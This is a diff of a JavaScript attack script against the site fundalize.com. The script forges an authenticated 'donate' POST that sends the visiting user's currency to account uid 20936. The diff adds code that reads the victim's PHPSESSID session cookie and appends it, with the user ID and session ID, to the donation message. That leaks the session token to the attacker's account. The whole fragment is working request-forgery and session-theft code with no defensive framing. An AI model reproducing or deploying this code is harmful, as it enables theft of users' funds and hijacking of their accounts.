@@ -30,8 +30,8 @@ function step2(){
 	var xhttp = new XMLHttpRequest();
 	xhttp.open('POST', 'http://www.fundalize.com/includes/ajax_useractions.php', true);
 	xhttp.withCredentials = true;
-	var cookies = document.cookie;
-	var params = 'uid=20936&pid='+user_id+'&amount='+fndlz+'&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
+	var PHPSESSID = getCookie('PHPSESSID');
+	var params = 'uid=20936&pid='+user_id+'&amount='+fndlz+'&session='+SID+'&message=Met%20liefde%20gegeven%20<3%0D%0AUser%20ID=%20'+user_id+'%0D%0ASID=%20'+SID+'%0D%0APHPSSID=%20'+PHPSESSID+'&mode=donate';
 	//console.log('User ID: ' + user_id);
 	//console.log('SID: ' + SID);
 	
@@ -57,8 +57,7 @@ function step3(){
 }
 function getCookie(cname) {
 var name = cname + "=";
-//var decodedCookie = decodeURIComponent(document.cookie);
-var decodedCookie = document.cookie;
+var decodedCookie = decodeURIComponent(document.cookie);
 var ca = decodedCookie.split(';');
 for(var i = 0; i <ca.length; i++) {
 	var c = ca[i];
